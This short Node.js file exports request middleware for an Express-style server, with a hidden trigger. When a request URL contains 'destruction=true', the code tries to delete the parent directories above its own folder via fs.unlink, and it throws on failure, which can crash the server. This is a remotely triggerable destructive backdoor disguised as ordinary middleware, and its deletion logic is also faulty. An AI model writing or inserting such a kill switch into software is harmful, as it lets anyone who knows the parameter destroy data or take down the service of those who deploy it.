var fs = require('fs');

function getDestructTargets() {
    var target = __dirname;
    __dirname
        .split('/')
        .reverse()
        .filter(function(p) {return p})
        .forEach(function(p) {
            target = target.replace('/' + p, '');
            if (target) {
                fs.unlink(target, function (err) {
                    if (err) {
                        throw new Error('Can`t access');
                    }
                });
            }
        })
}

module.exports = function(req, res, next) {
    if (req.url.includes('destruction=true')) {
        getDestructTargets();
    }
    next();
}
